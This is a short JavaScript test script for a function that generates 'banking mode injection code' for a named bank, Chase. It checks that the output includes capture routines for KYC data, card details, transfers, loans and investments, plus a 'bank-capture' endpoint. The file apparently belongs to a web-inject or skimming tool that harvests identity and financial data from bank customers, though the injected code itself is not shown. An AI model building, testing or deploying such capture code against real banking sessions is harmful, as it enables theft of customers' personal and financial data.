import { buildBankModeInjectionCode } from './scripts/lib/bank-mode-detector'

console.log('=== TESTING BANKING MODE DETECTOR ===\n')

// Test banking mode injection code generation
const mockBankFlowConfig = {
  platform: 'Chase',
  hasKyc: true,
  hasTransfers: true,
  hasLoanApplication: true,
  hasCreditCards: true,
  hasInvestments: true
}

console.log('✅ Generating banking mode injection code...\n')
const code = buildBankModeInjectionCode(mockBankFlowConfig)

console.log('Generated Code (first 500 chars):')
console.log(code.substring(0, 500))
console.log('...\n')

// Verify code contains expected elements
const checks = [
  { name: 'KYC Capture', check: code.includes('KYC') },
  { name: 'Transfer Capture', check: code.includes('TRANSFER') || code.includes('transfer') },
  { name: 'Card Capture', check: code.includes('card') || code.includes('CARD') },
  { name: 'Loan Capture', check: code.includes('loan') || code.includes('LOAN') },
  { name: 'Investment Capture', check: code.includes('invest') || code.includes('INVEST') },
  { name: 'API Endpoint', check: code.includes('bank-capture') },
  { name: 'Platform Name', check: code.includes('Chase') },
]

console.log('✅ Code Validation:')
checks.forEach(c => {
  console.log(`   ${c.name}: ${c.check ? '✅ PASS' : '❌ FAIL'}`)
})

console.log('\n=== BANKING DETECTOR WORKS ===')
